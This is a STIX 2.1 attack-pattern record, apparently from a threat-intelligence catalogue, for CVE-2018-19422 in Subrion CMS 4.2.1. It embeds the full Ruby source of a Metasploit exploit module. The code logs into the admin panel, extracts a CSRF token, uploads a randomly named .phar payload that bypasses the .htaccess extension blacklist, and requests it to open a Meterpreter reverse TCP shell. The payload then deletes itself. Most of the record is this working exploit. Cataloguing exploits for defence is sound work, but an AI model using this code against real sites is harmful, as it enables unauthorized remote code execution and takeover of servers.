{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--82118fef-7297-4393-89ef-b521f5f8c94e",
    "created": "2024-08-14T17:11:21.317456Z",
    "modified": "2024-08-14T17:11:21.31746Z",
    "name": "Intelliants Subrion CMS 4.2.1 - Authenticated File Upload Bypass to RCE",
    "description": " This module exploits an authenticated file upload vulnerability in Subrion CMS versions 4.2.1 and lower. The vulnerability is caused by the .htaccess file not preventing the execution of .pht, .phar, and .xhtml files. Files with these extensions are not included in the .htaccess blacklist, hence these files can be uploaded and executed to achieve remote code execution. In this module, a .phar file with a randomized name is uploaded and executed to receive a Meterpreter session on the target, then deletes itself afterwards.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/subrion_cms_file_upload_rce.rb",
            "external_id": "subrion_cms_file_upload_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-19422"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/intelliants/subrion/issues/801"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/intelliants/subrion/issues/840"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/advisories/GHSA-73xj-v6gc-g5p5"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::PhpEXE\n  include Msf::Exploit::Remote::HttpClient\n\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Intelliants Subrion CMS 4.2.1 - Authenticated File Upload Bypass to RCE',\n        'Description' => %q{\n          This module exploits an authenticated file upload vulnerability in\n          Subrion CMS versions 4.2.1 and lower. The vulnerability is caused by\n          the .htaccess file not preventing the execution of .pht, .phar, and\n          .xhtml files. Files with these extensions are not included in the\n          .htaccess blacklist, hence these files can be uploaded and executed\n          to achieve remote code execution. In this module, a .phar file with\n          a randomized name is uploaded and executed to receive a Meterpreter\n          session on the target, then deletes itself afterwards.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Hexife',             # Original discovery, PoC, and CVE submission\n          'Fellipe Oliveira',   # ExploitDB author\n          'Ismail E. Dawoodjee' # Metasploit module author\n        ],\n        'References' => [\n          [ 'EDB', '49876' ],\n          [ 'CVE', '2018-19422' ],\n          [ 'URL', 'https://github.com/intelliants/subrion/issues/801' ],\n          [ 'URL', 'https://github.com/intelliants/subrion/issues/840' ],\n          [ 'URL', 'https://github.com/advisories/GHSA-73xj-v6gc-g5p5' ]\n        ],\n        'Platform' => 'php',\n        'Arch' => ARCH_PHP,\n        'Targets' => [\n          [\n            'PHP',\n            {\n              'Platform' => 'php',\n              'Arch' => ARCH_PHP,\n              'Type' => :php,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'php/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2018-11-04',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(80, true, 'Subrion CMS default port'),\n        OptString.new('TARGETURI', [ true, 'Base path', '/' ]),\n        OptString.new('USERNAME', [ true, 'Username to authenticate with', 'admin' ]),\n        OptString.new('PASSWORD', [ true, 'Password to authenticate with', 'admin' ])\n      ]\n    )\n  end\n\n  def check\n    uri = normalize_uri(target_uri.path, 'panel/') # requires a trailing forward slash\n    print_status(\"Checking target web server for a response at: #{full_uri(uri)}\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => uri\n    })\n\n    unless res\n      return CheckCode::Unknown('Target did not respond to check request.')\n    end\n\n    unless res.code == 200 && res.body.downcase.include?('subrion')\n      return CheckCode::Unknown('Target is not running Subrion CMS.')\n    end\n\n    print_good('Target is running Subrion CMS.')\n\n    # Powered by <a href=\"https://subrion.org/\" title=\"Subrion CMS\">Subrion CMS v4.2.1</a><br>\n    print_status('Checking Subrion CMS version...')\n    version_number = res.body.to_s.scan(/Subrion\\sCMS\\sv([\\d.]+)/).flatten.first\n\n    unless version_number\n      return CheckCode::Detected('Subrion CMS version cannot be determined.')\n    end\n\n    print_good(\"Target is running Subrion CMS Version #{version_number}.\")\n\n    if Rex::Version.new(version_number) <= Rex::Version.new('4.2.1')\n      return CheckCode::Appears(\n        'However, this version check does not guarantee that the target is vulnerable, ' \\\n        'since a fix for the vulnerability can easily be applied by a web admin.'\n      )\n    end\n\n    return CheckCode::Safe\n  end\n\n  def login_and_get_csrf_token(username, password)\n    print_status('Connecting to Subrion Admin Panel login page to obtain CSRF token...')\n\n    # Session cookies need to be kept to preserve the CSRF token across multiple requests\n    uri = normalize_uri(target_uri.path, 'panel/')\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => uri,\n      'keep_cookies' => true\n    })\n\n    unless res && res.code == 200\n      fail_with(Failure::Unknown, \"#{peer} - Could not access the Subrion Admin Panel page.\")\n    end\n\n    # <input type=\"hidden\" name=\"__st\" value=\"CA0S3w50vz1zRpdgZl98JAMVrimiXI63lKtxAwyi\">\n    %r{name=\"__st\" value=\"(?<csrf_token>[\\w+=/]+)\">} =~ res.body\n    fail_with(Failure::NotFound, \"#{peer} - Failed to get CSRF token.\") if csrf_token.nil?\n\n    print_good(\"Successfully obtained CSRF token: #{csrf_token}\")\n\n    print_status(\n      \"Logging in to Subrion Admin Panel at: #{full_uri(uri)} \" \\\n      \"using credentials #{datastore['USERNAME']}:#{datastore['PASSWORD']}\"\n    )\n    auth = send_request_cgi({\n      'method' => 'POST',\n      'uri' => uri,\n      'keep_cookies' => true,\n      'vars_post' => {\n        '__st' => csrf_token,\n        'username' => username,\n        'password' => password\n      }\n    })\n\n    unless auth && auth.code == 200\n      fail_with(Failure::NoAccess, \"#{peer} - Failed to log in, cannot access the Admin Panel page.\")\n    end\n\n    %r{name=\"__st\" value=\"(?<csrf_token_auth>[\\w+=/]+)\">} =~ auth.body\n    unless csrf_token == csrf_token_auth && auth.body.downcase.include?('administrator')\n      fail_with(Failure::NoAccess, \"#{peer} - Failed to log in, invalid credentials.\")\n    end\n\n    print_good('Successfully logged in as Administrator.')\n    return csrf_token\n  end\n\n  def upload_and_execute_payload(csrf_token)\n    print_status('Preparing payload...')\n\n    # set `unlink_self: true` to delete the file after execution\n    payload_name = \"#{Rex::Text.rand_text_alpha_lower(10)}.phar\"\n    php_payload = get_write_exec_payload(unlink_self: true)\n\n    data = Rex::MIME::Message.new\n    data.add_part(Rex::Text.rand_text_alphanumeric(14), nil, nil, 'form-data; name=\"reqid\"')\n    data.add_part('upload', nil, nil, 'form-data; name=\"cmd\"')\n    data.add_part('l1_Lw', nil, nil, 'form-data; name=\"target\"')\n    data.add_part(csrf_token, nil, nil, 'form-data; name=\"__st\"')\n    data.add_part(\n      \"#{php_payload}\\n\",\n      'application/octet-stream',\n      nil,\n      \"form-data; name=\\\"upload[]\\\"; filename=\\\"#{payload_name}\\\"\"\n    )\n    data.add_part(Time.now.getutc.to_i.to_s, nil, nil, 'form-data; name=\"mtime[]\"')\n\n    print_status('Sending POST data...')\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'panel', 'uploads', 'read.json'),\n      'keep_cookies' => true,\n      'ctype' => \"multipart/form-data; boundary=#{data.bound}\",\n      'data' => data.to_s\n    })\n\n    unless res && res.code == 200\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Failed to upload PHP payload.\")\n    end\n    payload_uri = normalize_uri(target_uri.path, 'uploads', payload_name)\n\n    print_good(\"Successfully uploaded payload at: #{full_uri(payload_uri)}\")\n\n    # This execution request returns nil\n    print_status(\"Executing '#{payload_name}'... This file will be deleted after execution.\")\n    send_request_cgi({\n      'method' => 'GET',\n      'uri' => payload_uri,\n      'keep_cookies' => true\n    })\n\n    print_good(\"Successfully executed payload: #{full_uri(payload_uri)}\")\n  end\n\n  def exploit\n    csrf_token = login_and_get_csrf_token(datastore['USERNAME'], datastore['PASSWORD'])\n    upload_and_execute_payload(csrf_token)\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2018-11-04",
    "x_mitre_platforms": [
        "php'"
    ]
}